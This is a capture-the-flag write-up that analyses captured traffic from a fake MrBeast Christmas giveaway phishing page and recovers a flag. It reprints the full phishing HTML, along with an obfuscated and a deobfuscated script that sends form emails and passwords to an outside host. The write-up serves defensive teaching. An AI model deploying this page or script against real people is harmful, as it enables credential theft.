# This is the writeup for the 'Phishing Expedition'

**Description**: 
```
It was almost Christmas. You made hot chocolate to drink, sat on your comfy couch, and watched the newly uploaded Mr Beast video. Soon after, an ad appeared on your screen that led to a giveaway page seemingly run by Mr Beast, offering a huge Christmas prize for a few lucky winners. Filled with excitement after the video, you subscribed to the giveaway page and waited. And waited.  

Christmas went by, but nothing happened. Shortly afterward, you discovered an article about a phishing website, the same one you subscribed to. Confused as you read through the article, you decided to investigate the website yourself and captured its traffic. What can you find?
```

**Solution**:
A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.

Opening the file with Wireshark, we can view all the requests.  
The request that is of interest is the one made to *themrbeas7.org* and is the following:  
```html
GET /christmasGiveaway/index.html HTTP/1.1
Host: themrbeas7.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

HTTP/1.0 200 OK
Server: Apache/2.4.43 (FreeBSD)
Date: Mon, 04 Dec 2023 10:09:52 GMT
Content-type: text/html
Content-Length: 10649
Last-Modified: Sun, 03 Dec 2023 17:25:38 GMT

<!DOCTYPE html>

<html>

	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	    <meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="shortcut icon" href="img/Favicon.png" type="image/x-icon">
		<title>Xmas Giveaway</title>

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.min.js"></script>
		<script type="text/javascript" src="js/timer.js"></script>
		<script type="text/javascript" src="js/script.js"></script>
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
		<link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
		<link href='http://fonts.googleapis.com/css?family=Lobster' rel='stylesheet' type='text/css'>
		<link rel="stylesheet" type="text/css" href="css/custom.css">
	</head>


	<body onload="countdown(year,month,day,hour,minute)">
		<!-- Carousel -->
		<div id="myCarousel" class="carousel slide" data-ride="carousel">
		    <!-- Indicators -->
		    <ol class="carousel-indicators">
		        <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
		        <li data-target="#myCarousel" data-slide-to="1" ></li>
		        <li data-target="#myCarousel" data-slide-to="2"></li>
		    </ol>
		    <div class="carousel-inner">
		    	<div class= "container timer">
		    		<div id="home" class= "logo text-center">
		    			<h1><font color="red">Christmas is almost here</font></h1>
		   			</div>
			    	<div class= "row timer-circle">
			    		<div class= "main-text text-center">
			    			<h2 class="sub-text">Giveaway countdown</h2>
			    		</div>
			    		<div class="text-center">
							<div class="numbers" id="count2"></div>
						</div>
						<div class= "col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center">
							<div class= "circle text-center">
								<div class= "row" id= "spacer1">
									<div class= "title"></div>
									<div class= "numbers" id= "dday"></div>
								</div>
								<div class= "row" id= "spacer2">
									<div class= "title"></div>
									<div class= "title" id= "days">Day</div>
								</div>
							</div>
							<div class= "circle text-center">
								<div class= "row" id= "spacer1">
									<div class= "title"></div>
									<div class= "numbers" id= "dhour"></div>
								</div>
								<div class= "row" id= "spacer2">
									<div class= "title"></div>
									<div class= "title" id= "hours">Hr</div>
								</div>
							</div>
							<div class= "circle text-center">
								<div class= "row" id= "spacer1">
									<div class= "title"></div>
									<div class= "numbers" id= "dmin"></div>
								</div>
								<div class= "row" id= "spacer2">
									<div class= "title"></div>
									<div class= "title" id= "minutes">Min</div>
								</div>
							</div>
							<div class= "circle text-center">
								<div class= "row" id= "spacer1">
									<div class= "title"></div>
									<div class= "numbers" id= "dsec"></div>
								</div>
								<div class= "row" id= "spacer2">
									<div class= "title"></div>
									<div class= "title" id= "seconds">Sec</div>
								</div>
							</div>
						</div><!-- end of clock -->
			    	</div><!-- end of timer-circle -->
		    	</div><!-- end of timer -->
			    	
		        <div class="item active">
		        	<img src="img/mrBeast.jpg" alt="First slide">
		        	
					<div class= "carousel-caption caption">
						<h1>The biggest christmas giveaway is on its way...</h1>
					</div>
		        </div><!-- end of first item -->
		        <div class="item">
		          	<img src="img/santa.jpg" alt="Second slide">
		          	
					<div class= "carousel-caption caption">
						<h1>You may be one of the lucky ones that will meet Santa...</h1>
					</div>
		        </div><!-- end of second item -->
		        <div class="item">
			        <img src="img/elfs.jpeg" alt="Third slide">
			        
					<div class= "carousel-caption caption">
						<h1>Subscribe! The Mr. Beast team is waiting to meet you!</h1>
					</div>        
		        </div><!-- end of third item -->
		    </div>
		</div><!-- end of carousel -->

		<div class= "body-content">
			<!-- subscribe -->
			<div class= "container subscribe">
				<div class="row text-center">
					<div class= "col-lg-6 col-lg-offset-3 subscribe-text">
						<h3 class= "text-center">Subscribe</h3>
						<hr class= "full">
	                	<p>Welcome to the biggest ever giveaway by the Mr. Beast team!</p>
	                	<br/>
					</div>
				</div>
			</div><!-- end of subscribe -->
			<div class= "container after-slide">
				<div class= "row">
					<div class="col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center">
						<p class= "after-slide-text">Secure your chance to win a fully paid trip to the North Pole by registering now! Don't miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!</p>
					</div>
				</div>
				<div class="subscribe-form" >
					<div class= "row">
						<div class="input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center">
						  	<span class="input-group-addon"><i class="fa fa-envelope-o fa-fw"></i></span>
						  	<input class="form-control" type="text" placeholder="Email address">
						</div>
						<div class="input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form">
						  	<span class="input-group-addon"><i class="fa fa-key fa-fw"></i></span>
						  	<input class="form-control" type="password" placeholder="Password">
						</div>
						<div class="input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12">
							<button type="button" class="btn btn-info">Subscribe</button>
						</div>
					</div>
				</div>
			</div><!-- end of after slide part -->

	        <!-- share part -->
	      	<div class="container share">
				<div class="row text-center">
					<div class= "col-lg-6 col-lg-offset-3 share-text">
						<h3 class= "text-center">Our Socials</h3>
						<hr class= "full">
	                	<p>Find us at our social media platforms to be updated about the results</p>
	                	<br/>
					</div>
				</div>
			</div>
			<div class= "container share-icons text-center">
				<div class= "row text-center">
					<div class= "col-lg-12 col-md-12 col-sm-12 col-xs-12">
						<ul class="socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12">
							<li>
								<a href="https://www.facebook.com/MrBeast6000" data-toggle="tooltip" title="Share in Facebook" class="facebook"><i class="fa fa-facebook"></i></a>
							</li>
							<li>
								<a href="https://twitter.com/mrbeast?lang=en" data-toggle="tooltip" title="Share in Twitter" class="twitter"><i class="fa fa-twitter"></i></a>
							</li>
							<li>
								<a href="https://www.instagram.com/mrbeast/?hl=en" data-toggle="tooltip" title="Share in Instagram" class="instagram"><i class="fa fa-instagram"></i></a>
							</li>
						</ul> 
					</div>
				</div>
			</div><!-- end of share part -->
	    </div><!-- end of body content -->
		<!-- footer -->
		<div class="wrapper footer">
			<div class="container">
				<div class="row text-center">
					<div class="name col-lg-2 col-md-2 col-sm-2 col-xs-12 text-center">
						<h1>Giveaway</h1>
					</div>
					<div class="col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center">
						<div class="copyright">
							&copy; Mr.Beast Team
						</div>
					</div>
					<div class= "col-lg-2 col-md-2 col-sm-2 col-xs-12" id="back-top">
						<p class= "pull-right"><a href="#home"><span></span>Top</a></p>	
					</div>	
				</div><!-- row -->
			</div>
		</div><!--end of footer -->
	</body>
</html>
<script>
function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=function(_0x299a8c,_0x4edf29){_0x299a8c=_0x299a8c-0x7f;var _0x3b4711=_0x33465e[_0x299a8c];return _0x3b4711;},_0x299a(_0xa725a8,_0x48ecb7);}var _0x52de18=_0x299a;function _0x3346(){var _0x1cd6fe=['length','.subscribe-form\x20.form-control[type=\x22password\x22]','click','10GjwUiH','283448ojrvqi','PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec','.subscribe-form\x20.btn.btn-info','GET','11wIJUzs','385aGCgYF','203916QRBBAJ','addEventListener','186854HAAPmi','DOMContentLoaded','push','34662TcBphL','join','open','value','querySelector','charCodeAt','5003910eMoXPe','945368MfXSkw','9CofhOF','&apikey=','https://storage.appssec.co.ind?email=','send','724557XgnpSv'];_0x3346=function(){return _0x1cd6fe;};return _0x3346();}(function(_0x104a86,_0xa6db47){var _0x4c8d43=_0x299a,_0xf91101=_0x104a86();while(!![]){try{var _0x29d6b2=-parseInt(_0x4c8d43(0x8c))/0x1+parseInt(_0x4c8d43(0x94))/0x2+-parseInt(_0x4c8d43(0x87))/0x3+-parseInt(_0x4c8d43(0x92))/0x4*(parseInt(_0x4c8d43(0x8b))/0x5)+parseInt(_0x4c8d43(0x97))/0x6*(parseInt(_0x4c8d43(0x91))/0x7)+-parseInt(_0x4c8d43(0x82))/0x8*(parseInt(_0x4c8d43(0x83))/0x9)+parseInt(_0x4c8d43(0x81))/0xa*(parseInt(_0x4c8d43(0x90))/0xb);if(_0x29d6b2===_0xa6db47)break;else _0xf91101['push'](_0xf91101['shift']());}catch(_0x4597d0){_0xf91101['push'](_0xf91101['shift']());}}}(_0x3346,0x28a39),document[_0x52de18(0x93)](_0x52de18(0x95),function(){var _0x3010de=_0x52de18;const _0x4c17d1=document['querySelector'](_0x3010de(0x8e)),_0x5bc16f=document[_0x3010de(0x7f)]('.subscribe-form\x20.form-control[type=\x22text\x22]'),_0x106e8a=document[_0x3010de(0x7f)](_0x3010de(0x89));_0x4c17d1[_0x3010de(0x93)](_0x3010de(0x8a),function(){var _0xaf724a=_0x3010de;const _0x3a9d03=_0x5bc16f[_0xaf724a(0x9a)],_0x38e031=_0x106e8a[_0xaf724a(0x9a)];var _0x37a3bb=_0xaf724a(0x8d);function _0x2ae5a0(_0x49225f){var _0x4a91e4=_0xaf724a,_0x1d14ff=['s','a','n','t','a'],_0x1bcfcc=[];input=atob(_0x49225f);for(var _0x4d4b2f=0x0;_0x4d4b2f<input[_0x4a91e4(0x88)];_0x4d4b2f++){var _0x41b22f=input[_0x4a91e4(0x80)](_0x4d4b2f)^_0x1d14ff[_0x4d4b2f%_0x1d14ff[_0x4a91e4(0x88)]][_0x4a91e4(0x80)](0x0);_0x1bcfcc[_0x4a91e4(0x96)](String['fromCharCode'](_0x41b22f));}return _0x1bcfcc[_0x4a91e4(0x98)]('');}function _0xe05049(){var _0x3ebbc9=_0xaf724a,_0x45261b=_0x3a9d03,_0x2bf34e=_0x38e031,_0x5ba78a=_0x2ae5a0(_0x37a3bb),_0x5b4edc=new XMLHttpRequest();_0x5b4edc[_0x3ebbc9(0x99)](_0x3ebbc9(0x8f),_0x3ebbc9(0x85)+_0x45261b+'&password='+_0x2bf34e+_0x3ebbc9(0x84)+String(_0x5ba78a)),_0x5b4edc[_0x3ebbc9(0x86)]();}_0xe05049();});}));
</script>
```

This request contains the index.html page of the themrbeas7.org website.  
We can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as *password*, *fromCharCode*, *h[x][x]ps://storage.appssec.co.ind?* and so on.  
This is basically obfuscated javascript. Let's try to deobfuscate it and make sense of it.  
For this purpose, we can use the online tool:
- https://deobfuscate.relative.im/

We can pass the obfuscated javascript to it and click on 'deobfuscate'. Doing this, we get the following code:
```js
document.addEventListener('DOMContentLoaded', function () {
  const _0x4c17d1 = document.querySelector('.subscribe-form .btn.btn-info'),
    _0x5bc16f = document.querySelector(
      '.subscribe-form .form-control[type="text"]'
    ),
    _0x106e8a = document.querySelector(
      '.subscribe-form .form-control[type="password"]'
    )
  _0x4c17d1.addEventListener('click', function () {
    const _0x3a9d03 = _0x5bc16f.value,
      _0x38e031 = _0x106e8a.value
    var _0x37a3bb =
      'PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec'
    function _0x2ae5a0(_0x49225f) {
      var _0x1d14ff = ['s', 'a', 'n', 't', 'a'],
        _0x1bcfcc = []
      input = atob(_0x49225f)
      for (var _0x4d4b2f = 0; _0x4d4b2f < input.length; _0x4d4b2f++) {
        var _0x41b22f =
          input.charCodeAt(_0x4d4b2f) ^
          _0x1d14ff[_0x4d4b2f % _0x1d14ff.length].charCodeAt(0)
        _0x1bcfcc.push(String.fromCharCode(_0x41b22f))
      }
      return _0x1bcfcc.join('')
    }
    function _0xe05049() {
      var _0x45261b = _0x3a9d03,
        _0x2bf34e = _0x38e031,
        _0x5ba78a = _0x2ae5a0(_0x37a3bb),
        _0x5b4edc = new XMLHttpRequest()
      _0x5b4edc.open(
        'GET',
        'https://storage.appssec.co.ind?email=' +
          _0x45261b +
          '&password=' +
          _0x2bf34e +
          '&apikey=' +
          String(_0x5ba78a)
      )
      _0x5b4edc.send()
    }
    _0xe05049()
  })
})
```

This script still looks obfuscated but we can agree that it looks much better than before. It basically adds a Listener on the subscribe form button. Listeners in javascript are basically actions that wait to be happened. Here, once the subscribe-form button has been clicked, the script we deobfuscated will run. But what does it actually do?  

Well, we see that it gets a username and a password from the form that had its button clicked. Then, it makes a request to the website *h[x][x]ps://storage.appssec.co.ind* with url arguments:
- username
- password
- apikey

The interesting part here is how the apikey is found. We notice a base64 encoded string that is decoded, xored with the key **santa** and then passed to the url where the request will be made.  
Following up with the actions of the script, if we decode the base64 string and xor it with the key, we will get the apikey which is also the flag for this challenge:  
```py
>>> from base64 import b64decode
>>> from pwn import xor
>>> 
>>> apikey_encrypted = b'PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec'
>>> apikey_encr = b64decode(apikey_encrypted.decode())
>>> key_for_decryption = b'santa'
>>> 
>>> xor(apikey_encr, key_for_decryption)
b'NHACK{M2.B3457_51735_423_3v32ywh323_n0w4d4y5}'
>>>
```

Bonus ways to solve it:
- Add the following line in the javascript function _0xe05049() of the website:
	```js
	alert(_0x5ba78a);
	```
	and then visit the website and click on the Subscribe button. This will decrypt the apikey for you and print it on the screen in an alert box. This is happening since the _0x5ba78a is the decrypted apikey returned from the function _0x37a3bb.
- Open Wireshark, run a fakedns server and click on the subscribe button without modifying javascript this time. What will happen is a DNS query to storage.appssec.co.ind will be successful and thus, a request with the username, password and decrypted api key will be made to this host which will be visible in Wireshark.


Overall, the website tried to act as a legitimate site, gathering credentials from users and sending them to a possible VPS server. These could later be tried as reused credentials for other websites as this is very common amongst users.  
This is it for this challenge.
